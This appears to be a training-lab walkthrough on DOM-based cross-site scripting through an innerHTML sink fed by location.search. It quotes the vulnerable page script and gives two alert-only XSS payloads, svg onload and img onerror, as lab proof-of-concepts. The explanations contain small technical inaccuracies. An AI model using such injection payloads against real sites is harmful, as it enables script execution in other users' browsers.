# DOM XSS in innerHTML sink using source location.search

> **************************Instructions**************************
> 
> 
> This lab contains a [DOM-based cross-site scripting](../../Cross-site%20Scripting%20(XSS)/Sub_Pages/DOM-based%20XSS.md) vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
> 
> To solve this lab, perform a [cross-site scripting](../../Cross-site%20Scripting%20(XSS)/Cross-site%20scripting%20(XSS).md) attack that calls the `alert` function
> 

Access the Home page of the Lab:

![Untitled](DOM%20XSS%20in%20innerHTML%20sink%20using%20source%20locationSearch%20images/Untitled.png)

Press `F12` or `Ctrl + U` to view the Page’s source → You will see the `<script>` that handle the input data and display the content of page:

```html
<section class=blog-header>
	<h1><span>0 search results for '</span><span id="searchMessage"></span><span>'</span></h1>
	<script>
	function doSearchQuery(query) {
		document.getElementById('searchMessage').innerHTML = query;
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
	doSearchQuery(query);
	}
	</script>
</section>
```

![Untitled](DOM%20XSS%20in%20innerHTML%20sink%20using%20source%20locationSearch%20images/Untitled%201.png)

Use double-quote `"` to escape the `<span>` and append the `<svg>` attribute with `onload` event:

```html
thisisDOM-bassedXSS@"<svg onload="alert(1)"></svg>
```

![Untitled](DOM%20XSS%20in%20innerHTML%20sink%20using%20source%20locationSearch%20images/Untitled%202.png)

In some cases, the `<svg>` attribute might be disabled, neither the `onload` event. Therefore, the alternative elements like `img` or `iframe` could be used:

```html
thisisDOM-bassedXSS@"<img src=1 onerror=alert(1)>
```

The value from `src` is invalid and then it will trigger the `onerror` even and call the `alert()` function.